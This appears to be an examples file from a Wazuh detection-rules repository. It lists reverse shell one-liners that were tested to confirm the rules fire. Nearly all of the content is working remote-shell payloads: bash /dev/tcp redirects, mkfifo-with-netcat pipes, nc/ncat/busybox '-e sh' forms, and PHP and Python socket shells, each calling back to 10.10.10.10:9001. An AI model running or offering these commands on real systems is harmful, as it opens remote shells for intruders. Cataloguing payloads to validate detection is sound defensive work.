# Examples — Reverse Shell Patterns Tested Against Wazuh Rules

This document lists **reverse shell patterns that were tested and validated**
against the Wazuh rules in this repository.

All patterns are sourced from the public reference site:

👉 **https://www.revshells.com/**

The goal is to demonstrate **coverage and detection scope**, not to provide
operational attack guidance.

---

## ⚠️ IMPORTANT SECURITY NOTICE

- The commands below are **documented for defensive detection purposes only**
- **Do NOT execute** these commands on production systems
- Any execution must be done **only in an isolated lab**
- Prefer simulation via `auditd` + controlled CLI execution (`sudo -u <webuser>`)
- This repository focuses on **detection**, not exploitation

---

## 🧪 Test Scope

The following reverse shell techniques were tested and confirmed to trigger
the detection logic when executed in a lab environment with:

---

## 🐚 Shell-based Reverse Shells (`/dev/tcp` / `/dev/udp`)

```bash
sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

```bash
0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done
```

```bash
sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5
```

```bash
sh -i >& /dev/udp/10.10.10.10/9001 0>&1
```

---

## 🔁 FIFO / Named Pipe Reverse Shells

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.10.10.10 9001 >/tmp/f
```

---

## 🌐 Netcat / BusyBox Variants

```bash
busybox nc 10.10.10.10 9001 -e sh
```

```bash
nc -c sh 10.10.10.10 9001
```

```bash
ncat 10.10.10.10 9001 -e sh
```

---

## 🐘 PHP Reverse Shells (`fsockopen`)

```php
php -r '$sock=fsockopen("10.10.10.10",9001);exec("sh <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("10.10.10.10",9001);shell_exec("sh <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("10.10.10.10",9001);system("sh <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("10.10.10.10",9001);passthru("sh <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("10.10.10.10",9001);`sh <&3 >&3 2>&3`;'
```

```php
php -r '$sock=fsockopen("10.10.10.10",9001);popen("sh <&3 >&3 2>&3", "r");'
```

```php
php -r '$sock=fsockopen("10.10.10.10",9001);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

---

## 🐍 Python Reverse Shells (PTY-based)

```bash
export RHOST="10.10.10.10";export RPORT=9001;
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

```bash
export RHOST="10.10.10.10";export RPORT=9001;
python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

---

## 📄 License

MIT
